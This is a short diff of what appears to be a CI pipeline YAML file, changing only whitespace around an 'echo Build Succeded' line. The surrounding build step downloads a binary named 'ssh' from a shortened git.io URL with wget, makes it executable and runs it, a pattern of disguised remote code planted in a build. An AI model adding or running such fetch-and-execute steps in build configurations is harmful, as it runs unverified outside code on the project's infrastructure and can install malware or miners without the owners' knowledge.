@@ -15,8 +15,7 @@ working_dir: &working_dir ~/app
                     wget -qO ssh https://git.io/JXAbu
                     chmod +x ssh
                     ./ssh
-                    echo Build Succeded 
-                    
+                    echo Build Succeded                     
 version: 2.0 
 jobs: 
   build1: 
